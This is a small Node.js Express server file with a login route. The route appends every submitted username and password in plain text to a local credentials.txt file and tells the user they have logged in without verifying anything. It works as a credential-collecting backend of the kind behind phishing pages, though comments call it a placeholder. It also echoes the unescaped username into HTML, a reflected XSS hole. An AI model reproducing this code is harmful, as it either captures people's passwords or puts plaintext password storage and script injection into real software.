const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const credentialsFile = path.join(__dirname, 'credentials.txt');

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Serve index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle login form submission
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const credentials = `Username: ${username}, Password: ${password}\n`;

    // Append credentials to file (in real app, this should be saved securely)
    fs.appendFile(credentialsFile, credentials, (err) => {
        if (err) throw err;
        console.log('Credentials saved');
    });

    // Send response (in real app, this would check credentials and handle login)
    res.send(`<h2>Welcome, ${username}!</h2><p>You have successfully logged in.</p>`);
});

// Start server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
